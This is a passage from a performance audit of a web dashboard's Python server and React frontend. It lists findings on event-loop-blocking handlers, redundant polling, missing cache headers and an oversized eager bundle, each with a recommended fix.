- **Location:** `hermes_cli/web_server.py:5460, hermes_cli/web_server.py:5537, hermes_cli/web_server.py:11424, web/src/screens/SessionsPage.tsx:878, web/src/screens/LogsPage.tsx`
- **Effort / confidence:** S / high
- **Description:** get_sessions (async def) opens SessionDB, optionally computes tag-filtered ID sets in Python, then runs list_sessions_rich plus session_count, all on the event loop. get_logs (async def) reads the log file (up to 2000 lines for filtered/search reads) and does Python substring filtering on the loop. SessionsPage re-runs getSessions(50) every 5 s and LogsPage re-fetches every 5 s while auto-refresh is on, so each open tab adds a steady trickle of loop-blocking work that adds latency to every stream.
- **Recommendation:** Convert these to sync `def` handlers (threadpool) or offload to an executor. Tail logs with seek-from-end instead of reading whole files, and return ETag/If-None-Match (or a `since` cursor) so unchanged polls are cheap.

### web-tui-desktop-6. Overlapping dashboard polls that keep running in hidden tabs — Low

- **Location:** `web/src/hooks/useSidebarStatus.ts:5, web/src/screens/SessionsPage.tsx:853-878, web/src/screens/LogsPage.tsx, web/src/screens/SystemPage.tsx:235-245`
- **Effort / confidence:** S / high
- **Description:** The sidebar polls /api/status every 10 s. SessionsPage separately polls /api/status and /api/sessions?limit=50 every 5 s (so status is fetched twice by the same tab). LogsPage polls every 5 s and SystemPage fans out 9 parallel API calls on load and after actions. None of these timers check document.visibilityState, so background tabs and forgotten operator windows keep generating the loop-blocking requests described in the findings above.
- **Recommendation:** Share one status source (React context or SWR/react-query with a shared key) instead of separate pollers. Pause intervals when document.hidden is true and refetch on visibilitychange. Prefer pushing status over the existing /api/events channel.

### web-tui-desktop-7. SPA index.html and CSS re-read from disk (and CSS rewritten) on every request; CSS has no cache validators — Low

- **Location:** `hermes_cli/web_server.py:16776, hermes_cli/web_server.py:16818, hermes_cli/web_server.py:16830-16836, hermes_cli/web_server.py:16849, hermes_cli/web_server.py:16873`
- **Effort / confidence:** S / high
- **Description:** The SPA fallback reads index.html with read_text() on each navigation and sends it with no-store, so it can never be revalidated. _serve_css_file reads the CSS bundle and runs _rewrite_css_asset_prefix on every request, synchronously on the event loop, and returns it without ETag, Last-Modified or Cache-Control, so browsers re-download the full stylesheet on every load. Hashed /assets files go through StaticFiles, which only provides ETag/Last-Modified (revalidation round trips) rather than `Cache-Control: immutable`.
- **Recommendation:** Read and rewrite index.html and CSS once at startup (or cache them keyed by mtime and prefix). Serve CSS with an ETag and a long max-age, since it is content-hashed. Add `Cache-Control: public, max-age=31536000, immutable` for /assets/*, either in a small StaticFiles subclass or in the Caddy config.

### web-tui-desktop-8. Dashboard ships one eager bundle: all screens, xterm + WebGL, Observable Plot and 17 locales — Low

- **Location:** `web/src/App.tsx, web/src/screens/ChatPage.tsx:22, web/src/screens/MemoryPage.tsx:3, web/src/i18n/context.tsx:20`
- **Effort / confidence:** M / medium
- **Description:** AppRoot imports App statically, and App imports all ~26 screens statically. ChatPage pulls in @xterm/xterm plus the fit, unicode11, web-links and WebGL addons. MemoryPage pulls in all of @observablehq/plot (and d3 transitively). i18n/context.tsx imports every locale into the TRANSLATIONS map (~533 KB of TS source across web/src/i18n). Every dashboard load (including the Electron webview and phone access through Caddy) downloads and parses all of it before first paint, even for screens the operator never opens.
- **Recommendation:** Use React.lazy and Suspense per route, especially ChatPage, MemoryPage, AnalyticsPage and DocsPage. Load locales with dynamic `import()` for the active language only (keep `en` eager as the fallback). Load the xterm WebGL addon on demand.

